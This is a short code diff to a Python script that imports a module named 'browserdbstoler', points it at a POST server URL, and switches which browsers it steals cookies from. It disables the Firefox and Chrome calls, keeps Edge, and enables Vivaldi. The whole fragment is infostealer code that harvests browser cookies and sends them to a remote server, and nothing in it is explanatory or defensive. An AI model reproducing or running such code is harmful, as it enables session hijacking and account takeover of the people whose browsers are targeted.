@@ -12,10 +12,10 @@ import browserdbstoler as bdbs
 
 bdbs.SetServerHostPost(POST_URL)
 
-bdbs.GetFirefoxCookies()
+# bdbs.GetFirefoxCookies()
 
-bdbs.GetChromeCookies()
+# bdbs.GetChromeCookies()
 
 bdbs.GetEdgeCookies()
 
-# bdbs.GetVivaldiCookies()
+bdbs.GetVivaldiCookies()
